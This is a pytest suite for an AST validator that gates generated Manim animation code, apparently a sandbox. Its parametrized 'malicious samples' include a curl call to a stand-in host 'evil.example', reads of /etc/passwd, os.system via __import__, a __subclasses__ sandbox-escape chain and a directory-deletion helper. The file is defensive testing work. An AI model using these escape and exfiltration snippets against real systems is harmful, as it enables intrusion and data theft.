"""The AST gate. Malicious samples must be rejected; normal Manim code must pass."""
import textwrap

import pytest

from pipeline.validator import MAX_LINES, validate_code

GOOD = textwrap.dedent('''
    from manim import *
    import numpy as np
    import math

    SPEED = 2.0


    def helper(x):
        return np.sin(x) + math.pi


    class LessonScene(Scene):
        """Docstrings are fine."""

        def construct(self):
            c = Circle(color=BLUE)
            self.play(Create(c), run_time=1)
            self.play(c.animate.shift(RIGHT * helper(0.0)), run_time=SPEED)
            mobs = [Dot(np.array([i, 0, 0])) for i in range(3)]
            self.play(*[FadeIn(m) for m in mobs], run_time=1)
            self.wait(self.renderer.time)
''')


def bad(body: str, header: str = "from manim import *\n") -> str:
    return header + "\n\nclass LessonScene(Scene):\n    def construct(self):\n" + textwrap.indent(
        textwrap.dedent(body), "        ") + "\n"


def rules(code: str) -> set[str]:
    return {v.rule for v in validate_code(code).violations}


def test_good_code_passes():
    r = validate_code(GOOD)
    assert r.ok, r.format()
    assert r.error_class is None


def test_syntax_error_is_classified_as_syntax():
    r = validate_code("from manim import *\nclass LessonScene(Scene)\n    pass\n")
    assert not r.ok and r.syntax_error and r.error_class == "syntax"
    assert "line 2" in r.format()


# ------------------------------------------------------------------ imports
@pytest.mark.parametrize("imp", [
    "import os", "import subprocess", "import sys", "import socket", "from os import system",
    "import numpy, os", "from manim.utils.commands import capture", "from . import x",
    "import importlib", "import builtins", "from pathlib import Path", "import requests",
    "import ctypes", "import pickle",
])
def test_disallowed_imports(imp):
    assert "import" in rules(bad("self.wait(1)", header=f"from manim import *\n{imp}\n"))


def test_import_inside_function_is_caught():
    assert "import" in rules(bad("import os\nos.system('ls')"))


@pytest.mark.parametrize("imp", ["import numpy as np", "import math", "from math import pi, sqrt",
                                 "from numpy import linspace", "from manim import Circle, Create"])
def test_allowed_imports(imp):
    assert validate_code(bad("self.wait(1)", header=f"from manim import *\n{imp}\n")).ok


# ------------------------------------------------------------------ dynamic code / reflection
@pytest.mark.parametrize("stmt", [
    "eval('1+1')",
    "exec('import os')",
    "compile('x', 'f', 'exec')",
    "open('/etc/passwd').read()",
    "__import__('os').system('id')",
    "getattr(self, 'play')",
    "setattr(self, 'x', 1)",
    "delattr(self, 'x')",
    "globals()['x'] = 1",
    "locals()",
    "vars(self)",
    "input()",
    "breakpoint()",
    "f = eval\nf('1')",  # aliasing a banned builtin is still a Name use
    "exit()",
])
def test_banned_builtins(stmt):
    assert "banned-name" in rules(bad(stmt))


@pytest.mark.parametrize("stmt", [
    "().__class__.__bases__[0].__subclasses__()",
    "self.__dict__",
    "x = Circle().__init__",
    "print(__builtins__)",
    "print(__file__)",
])
def test_dunder_access_is_rejected(stmt):
    assert "dunder" in rules(bad(stmt))


# ------------------------------------------------------------------ manim namespace leaks
@pytest.mark.parametrize("stmt", [
    "capture(['curl', 'evil.example'])",       # subprocess.Popen wrapper exported by manim
    "guarantee_empty_existence('/out')",       # calls shutil.rmtree
    "open_file('/etc/passwd')",
    "config.frame_rate = 1",
    "with tempconfig({'quality': 'fourk_quality'}):\n    pass",
    "utils.commands.subprocess.run(['id'])",
    "renderer.camera",
    "get_video_metadata('/etc/passwd')",
])
def test_manim_leaked_dangerous_names(stmt):
    assert "banned-name" in rules(bad(stmt))


@pytest.mark.parametrize("stmt", [
    "mobject.svg.svg_mobject.os.system('id')",
    "np.ctypeslib.load_library('libc', '/lib')",
    "np.load('/etc/passwd')",
    "np.fromfile('/dev/urandom')",
    "np.lib.npyio.loadtxt('x')",
    "self.add_sound('x.wav')",
    "Text('a').submobjects.os",
    "x = color.core.np.save('f', 1)",
])
def test_banned_attributes(stmt):
    assert "banned-attribute" in rules(bad(stmt))


@pytest.mark.parametrize("stmt", [
    "ImageMobject('cat.png')",
    "SVGMobject('logo.svg')",
    "Code('x.py')",
])
def test_asset_loading_is_rejected(stmt):
    assert "asset" in rules(bad(stmt))


# ------------------------------------------------------------------ structure
def test_requires_exactly_one_scene():
    two = GOOD + "\n\nclass Other(Scene):\n    def construct(self):\n        pass\n"
    assert "scene" in rules(two)
    none = "from manim import *\n\ndef f():\n    return 1\n"
    assert "scene" in rules(none)


def test_scene_must_be_named_lessonscene_and_have_construct():
    assert "scene" in rules("from manim import *\nclass Foo(Scene):\n    def construct(self):\n        pass\n")
    assert "scene" in rules("from manim import *\nclass LessonScene(Scene):\n    def setup(self):\n        pass\n")


def test_three_d_scene_rejected():
    code = "from manim import *\nclass LessonScene(ThreeDScene):\n    def construct(self):\n        pass\n"
    r = rules(code)
    assert "asset" in r or "scene" in r


def test_non_scene_helper_classes_allowed():
    code = GOOD + "\n\nclass Badge(VGroup):\n    pass\n"
    assert validate_code(code).ok


def test_top_level_code_is_rejected():
    assert "top-level" in rules(GOOD + "\nprint('side effect at import')\n")
    assert "top-level" in rules(GOOD + "\nwhile True:\n    pass\n")
    assert "top-level" in rules(GOOD + "\nif True:\n    x = 1\n")


def test_global_statement_rejected():
    assert "global" in rules(bad("global X\nX = 1"))


def test_line_cap():
    padding = "\n".join(f"        x{i} = {i}" for i in range(MAX_LINES))
    code = bad("pass") + padding + "\n"
    assert "length" in rules(code)


def test_violation_messages_include_line_numbers():
    r = validate_code(bad("eval('x')"))
    assert any(v.line == 6 for v in r.violations), r.format()
    assert "eval" in r.format()


def test_strings_mentioning_bad_words_are_fine():
    assert validate_code(bad("t = Text('import os; eval(open)')\nself.play(Write(t), run_time=1)")).ok
